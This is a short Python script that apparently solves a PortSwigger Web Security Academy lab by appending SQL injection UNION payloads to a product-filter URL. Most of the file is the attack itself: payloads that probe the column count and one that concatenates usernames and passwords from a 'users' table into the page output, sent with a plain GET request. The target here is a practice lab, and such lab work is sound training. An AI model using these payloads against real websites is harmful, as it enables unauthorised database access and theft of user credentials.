import requests as req

def getrequest(url):
    return req.get(url).content

def postrequest(url,data):
    return req.post(url=url,data=data)


def main():
    payload =  "'UNION SELECT NULL,'username: ' || username || ' password: ' || password from users--"
    payload2 = "'UNION SELECT NULL,NULL,NULL --"
    payload3 = "'UNION SELECT NULL,NULL,'a' --"
    url = "https://acc41f171e038caf80c8003a008e000f.web-security-academy.net/filter?category=Lifestyle"
    print(getrequest(url+payload))      

if __name__ == '__main__':
    main()
